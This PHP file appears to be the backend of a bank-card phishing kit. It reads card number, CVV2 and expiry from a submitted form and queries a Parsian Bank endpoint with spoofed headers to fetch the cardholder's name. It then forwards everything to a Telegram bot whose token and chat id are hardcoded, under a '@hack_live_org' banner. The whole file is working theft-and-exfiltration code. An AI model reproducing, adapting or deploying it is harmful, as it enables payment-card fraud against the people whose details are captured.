<?php
include "functions.php";
$card=$_POST['CardNump'];
$cvv=$_POST['cvv2p'];
$mah=$_POST['expireMonthp'];
$sal=$_POST['expireYearp'];

$cardn6 = substr($card,0,4);
$cardn5 = substr($card,5,2);
$cardn = $cardn6.$cardn5;
$cardn1 = substr($card,0,4);
$cardn2 = substr($card,5,4);
$cardn3 = substr($card,10,4);
$cardn4 = substr($card,15,4);
$allcards = $cardn1.$cardn2.$cardn3.$cardn4;


$bankinfo = bank_information($cardn);
//Card holder
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://ipb.parsian-bank.ir/mobileBank/1.0/getCardOwnerWithoutLogin");
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt( $ch, CURLOPT_HTTPHEADER, array("REMOTE_ADDR: " . $_SERVER["REMOTE_ADDR"], "HTTP_X_FORWARDED_FOR: ". $_SERVER["REMOTE_ADDR"]));
        curl_setopt($ch, CURLOPT_POSTFIELDS, "{\"destinationPan\":\"$allcards\",\"pan\":\"6280231350040589\"}");
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Content-Type: application/json; charset=UTF-8',
            'User-Agent: Mozilla/5.0 (Linux; Android 6.0; ALE-L21 Build/HuaweiALE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/63.0.3239.83 Mobile Safari/537.36'
        ));
        $result     = curl_exec($ch);
        $json       = json_decode($result, true);
        $holderName = $json["firstName"] . " " . $json["lastName"];
        curl_close($ch);
        //Card holder

$message = "
⚠️🍓 OTP CARD🍓⚠️
➖➖➕➖➕➖➖
🔻 Card: $allcards
🔸Cvv2: $cvv
🔺month:  $mah  Year: $sal
➖➖Cᴀʀᴅ ɪɴғᴏʀᴍᴀᴛɪᴏɴ➖➖
🏦Bank: $bankinfo[1]
🍱Cardholder:  $holderName
➖➕ @hack_live_org  ➕➖
";

$ID = 1138598748; // Chat id (Channel, sGroup, pv , ...)
$TOKEN = "5322968987:AAFMgVukmG5wxFEf44wXz6DrM4UUxkGaDkI"; //Bot Token 





$send = file_get_contents("https://api.telegram.org/bot$TOKEN/SendMessage?chat_id=$ID&text=".urlencode($message));
?>
